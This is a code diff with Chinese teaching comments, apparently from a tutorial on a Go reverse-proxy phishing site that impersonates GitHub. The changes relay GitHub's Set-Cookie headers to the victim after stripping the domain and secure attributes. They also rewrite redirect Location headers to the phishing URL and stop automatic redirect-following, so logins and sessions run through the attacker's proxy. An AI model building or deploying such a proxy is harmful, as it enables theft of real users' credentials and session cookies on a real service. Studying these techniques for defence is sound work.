@@ -17,15 +17,32 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	// 複製請求
 	req := cloneRequest(r)
 	// 發出請求
-	body, header := sendReqToUpstream(req)
+	body, header, statusCode := sendReqToUpstream(req)
 
 	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
 	for _, v := range header["Set-Cookie"] {
-		w.Header().Add("Set-Cookie", v)
+		// 把 domain=.github.com 移除
+		// -1的意思是取代全部
+		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
+
+		// 把 secure 移除
+		newValue = strings.Replace(newValue, "secure;", "", 1)
+		w.Header().Add("Set-Cookie", newValue)
 	}
 
 	// 取代後的 body
 	body = replaceURLInResp(body, header)
+
+	// 如果 status code 是 3XX 就取代 Location 網址
+	if statusCode >= 300 && statusCode < 400 {
+		location := header.Get("Location")
+		// -1的意思是取代全部
+		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
+		w.Header().Set("Location", newLocation)
+	}
+
+	// 轉傳正確的 status code 給瀏覽器
+	w.WriteHeader(statusCode)
 
 	//回覆 html 頁面給瀏覽器
 	w.Write(body)
@@ -56,9 +73,14 @@ func cloneRequest(r *http.Request) *http.Request {
 
 // 發出請求
 // body 的型別是 Reader，有點像 Stream（串流）的概念，要用 ioutil.ReadAll 把它讀取出來變成 []byte
-func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
+func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
 	// 建立 http client
-	client := http.Client{}
+	// 讓 http client 不要自動 follow redirect
+	// 只要在初始化 http client 時指定一個 CheckRedirect function 就可以了，Go 每次要 follow redirect 之前都會先跑這個 function，如果回傳 http.ErrUseLastResponse 這個錯誤他就不會跟隨 redirect 而是直接得到回覆
+	checkRedirect := func(r *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+	client := http.Client{CheckRedirect: checkRedirect}
 
 	// client.Do(req) 會發出請求到 Github、得到回覆 resp
 	resp, err := client.Do(req)
@@ -74,7 +96,7 @@ func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
 	resp.Body.Close()
 
 	// 回傳 body, 取得 http header
-	return respBody, resp.Header
+	return respBody, resp.Header, resp.StatusCode
 }
 
 //取代html中所有https://github.com 網址為 http://localhost:8080
